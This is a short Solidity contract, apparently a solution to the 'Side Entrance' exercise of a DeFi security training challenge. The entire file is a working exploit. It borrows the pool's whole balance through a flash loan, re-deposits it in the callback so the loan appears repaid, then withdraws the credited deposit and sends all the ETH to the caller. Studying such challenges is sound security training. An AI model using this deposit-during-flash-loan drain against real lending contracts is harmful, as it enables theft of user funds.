// SPDX-License-Identifier: MIT 

import "./SideEntranceLenderPool.sol";

contract SideEntranceExploit {
    SideEntranceLenderPool pool;

    constructor() {
    }

    function exploit(address victim) external payable {
        pool = SideEntranceLenderPool(victim);
        pool.flashLoan(victim.balance);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }    

    function execute() external payable {
        SideEntranceLenderPool(pool).deposit{value: address(this).balance}();
    }

    receive() external payable {}
}